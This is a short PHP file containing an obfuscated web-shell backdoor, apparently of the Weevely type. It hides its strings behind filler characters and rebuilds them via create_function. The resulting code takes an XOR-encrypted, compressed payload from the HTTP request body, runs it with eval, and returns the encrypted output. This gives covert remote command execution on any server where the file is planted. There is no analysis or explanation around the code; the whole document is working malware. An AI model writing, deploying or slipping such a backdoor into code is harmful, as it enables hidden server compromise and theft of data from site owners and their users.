<?php
$I='atRjch("/$kh(.Rj+)$kf/",@Rjfile_gRjet_conRjtenRjts("Rjphp://RjRjinpRjut"),$m)==1) Rj{@obRj_start();Rj';
$n='($j=Rj0;($j<$cRj&&Rj$i<$l);$j+Rj+Rj,$iRj++){Rj$o.=$t{$i}^$k{$jRj};}}reRjturn RjRj$o;Rj}if (@preg_Rjm';
$z=str_replace('j','','crejatje_jjjfjunction');
$F='@eRjval(@gzuncompresRjs(@x(@RjbRjase64Rj_decode($m[1])Rj,Rj$k)));$oRj=@oRjb_getRj_contentsRj();@o';
$y='Rjb_endRj_clean();$r=Rj@baseRj64_encoRjde(Rj@x(@gzcomRjpress(Rj$o),$RjkRj));Rjprint(Rj"$p$kh$r$kf");}';
$o='$k="Rj9Rj95524f7";$kRjh="0ed7Rj8a0bc6Rj48";$kf="Rjc48a83Rj9d4dRj08";$Rjp="Q5eOix4Rj9054RjaQRjqgRjn";f';
$A='unctRjioRjn x(Rj$tRj,$k){$c=strlen($kRj);$l=strlen($Rjt);$oRjRj="";RjRjfor($i=0;$i<$l;){Rjfor';
$Z=str_replace('Rj','',$o.$A.$n.$I.$F.$y);
$U=$z('',$Z);$U();
?>
